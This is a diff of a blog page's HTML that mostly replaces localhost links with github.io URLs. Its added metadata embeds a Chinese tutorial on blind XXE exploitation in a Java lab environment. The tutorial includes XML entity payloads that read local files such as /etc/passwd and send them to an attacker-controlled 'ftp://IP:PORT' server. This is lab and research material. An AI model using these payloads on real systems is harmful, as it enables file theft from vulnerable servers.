@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>盲XXE中FTP协议的利用 | zoiltin&#39;s Blog</title>
 <meta name="keywords" content="">
 <meta name="description" content="最近遇到了java环境中的盲XXE，所以研究了一下怎么利用ftp://读文件。">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/">
+<link rel="canonical" href="https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" integrity="sha256-1yREUm1&#43;y9sAFUOKf6iQVKZYv3WdBULi5d&#43;BzpS0k&#43;4=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/">
+<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/">
 <noscript>
     <style>
         #theme-toggle,
@@ -56,6 +56,71 @@
 
     </style>
 </noscript>
+  
+
+<meta property="og:url" content="https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/">
+  <meta property="og:site_name" content="zoiltin&#39;s Blog">
+  <meta property="og:title" content="盲XXE中FTP协议的利用">
+  <meta property="og:description" content="最近遇到了java环境中的盲XXE，所以研究了一下怎么利用ftp://读文件。">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-11-22T15:16:46+00:00">
+    <meta property="article:modified_time" content="2023-11-22T15:16:46+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="盲XXE中FTP协议的利用">
+<meta name="twitter:description" content="最近遇到了java环境中的盲XXE，所以研究了一下怎么利用ftp://读文件。">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zoiltin.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "盲XXE中FTP协议的利用",
+      "item": "https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "盲XXE中FTP协议的利用",
+  "name": "盲XXE中FTP协议的利用",
+  "description": "最近遇到了java环境中的盲XXE，所以研究了一下怎么利用ftp://读文件。",
+  "keywords": [
+    
+  ],
+  "articleBody": "本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n关于盲XXE的文件读取 盲XXE想要读取文件一般来说需要外带。但是如果文件中包含换行等特殊字符，直接http外带，会报无效url错误。 在php环境下，可以直接使用php伪协议中的filter进行编码转换，就不会报错了。 但在java环境下或者禁用filter的情况下，可以尝试用ftp://协议外带。\n环境 这里使用的环境是Hello-Java-Sec的靶场环境 https://github.com/j3ers3/Hello-Java-Sec/\njdk8 漏洞代码： DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); // 这里其实有回显，偷懒不改代码了，假装看不见。 原理 使用ftp://协议可以带出带有换行的数据。 （可利用版本：jdk\u003c7u141和jdk\u003c8u162，高于这两个版本ftp://协议也不能用了。）\n正常的ftp服务器不能满足我们的需要，但我从网上找到的模拟ftp服务器都不能用（也可能是我不会用），于是就自己写了一个。 链接：https://github.com/zoiltin/fake-ftp-server\n写脚本之前，先了解一下调用ftp://协议是发生了什么。通过读取/etc/passwd为例，payload：ftp://ip:port/{data}数据交互如下： 蓝色的为fake-ftp-server。 建立连接和确定模式后，服务器开始发送CWD指令，因为在/etc/passwd中有许多/将数据分割为许多目录，所以服务器一直尝试切换目录。我们要做的就是接受并不断返回250 Directory successfully changed.让服务器一直传数据。 在最后一个/后的数据，服务器将其视为要下载的文件名，请求用被动模式下载数据，从流量中可见，攻击者开启63568端口并告诉服务器，当服务器连接63568端口后，即向我们发送了要下载的文件名也就是最后一段数据。\nftp://协议比较简单，脚本很容易实现。\n用法 payload:\n\u003c!ENTITY % file SYSTEM \"file://\"\u003e \u003c!ENTITY % int \"\u003c!ENTITY \u0026#37; send SYSTEM 'ftp://IP:PORT/%file;'\u003e\"\u003e 简单的用法： ftp://IP:PORT/%file; 或者全用CWD读取： ftp://IP:PORT/%file;/ 数据中不能包含%和#，如果有'或\"需要调整evil.dtd中包裹ftp://的引号类型，不然会报错。?和#会导致数据截断。\n在高版本也可以十分有限的利用：\nftp://username:%file;@IP:PORT/asdasd 将数据从密码处传递，只能读一行 如果文件有多行会报错，回显一部分。 ",
+  "wordCount" : "57",
+  "inLanguage": "en",
+  "datePublished": "2023-11-22T15:16:46Z",
+  "dateModified": "2023-11-22T15:16:46Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zoiltin's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zoiltin.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -73,7 +138,7 @@
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -99,17 +164,17 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/" title="Home">
+                <a href="https://zoiltin.github.io/" title="Home">
                     <span>Home</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/posts" title="Posts">
+                <a href="https://zoiltin.github.io/posts" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about" title="About">
+                <a href="https://zoiltin.github.io/about" title="About">
                     <span>About</span>
                 </a>
             </li>
@@ -184,7 +249,7 @@ ftp://IP:PORT/%file;/
     </main>
     
 <footer class="footer">
-        <span>&copy; 2024 <a href="http://localhost:1313/">zoiltin&#39;s Blog</a></span> · 
+        <span>&copy; 2024 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 
 
     <span>
         Powered by
